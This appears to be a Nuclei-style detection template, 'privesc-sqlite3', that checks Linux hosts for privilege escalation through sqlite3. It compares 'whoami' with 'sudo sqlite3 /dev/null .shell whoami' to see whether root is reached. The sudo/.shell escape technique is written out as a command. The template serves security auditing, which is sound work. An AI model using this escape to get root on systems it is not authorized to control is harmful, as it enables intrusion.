code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  source: 'sqlite3 /dev/null ''.shell whoami''

    '
- engine:
  - sh
  - bash
  matchers:
  - negative: true
    part: code_1_response
    type: word
    words:
    - root
  - condition: or
    dsl:
    - contains(code_2_response, "root")
    - contains(code_3_response, "root")
    type: dsl
  matchers-condition: and
  source: 'sudo sqlite3 /dev/null ''.shell whoami''

    '
id: privesc-sqlite3
info:
  author: daffainfo
  description: 'sqlite3 is a lightweight, self-contained, and serverless SQL database
    engine. It is widely used in embedded systems, mobile devices, and small to medium-sized
    applications.

    '
  metadata:
    max-request: 3
    verified: true
  name: sqlite3 - Privilege Escalation
  reference:
  - https://gtfobins.github.io/gtfobins/sqlite3/
  severity: high
  tags: code,linux,sqlite3,privesc,local
self-contained: true
